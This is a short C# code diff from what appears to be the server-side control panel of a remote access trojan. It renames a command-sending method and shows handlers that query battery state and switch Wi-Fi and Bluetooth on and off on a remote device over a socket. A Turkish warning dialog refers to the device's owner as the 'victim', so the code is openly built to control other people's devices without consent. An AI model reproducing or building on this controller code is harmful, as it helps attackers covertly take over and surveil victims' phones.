@@ -28,7 +28,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("SARJ", "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("SARJ", "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -37,7 +37,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("WIFI", "[VERI]true[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("WIFI", "[VERI]true[VERI][0x09]", sck);
                 button1.PerformClick();
             }
             catch (Exception) { }
@@ -50,7 +50,7 @@ namespace Server.Views
                 if (MessageBox.Show("Bunu yaparsanız kurban ile aranızdaki bağlantı kopabilir. Emin misiniz?",
                     "Uyarı", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 {
-                    MainWindow.KomutGonder("WIFI", "[VERI]false[VERI][0x09]", sck);
+                    MainWindow.GoToOurSocket("WIFI", "[VERI]false[VERI][0x09]", sck);
                     button1.PerformClick();
                 }
             }
@@ -61,7 +61,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("BLUETOOTH", "[VERI]true[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("BLUETOOTH", "[VERI]true[VERI][0x09]", sck);
                 button1.PerformClick();
             }
             catch (Exception) { }
@@ -71,7 +71,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("BLUETOOTH", "[VERI]false[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("BLUETOOTH", "[VERI]false[VERI][0x09]", sck);
                 button1.PerformClick();
             }
             catch (Exception) { }
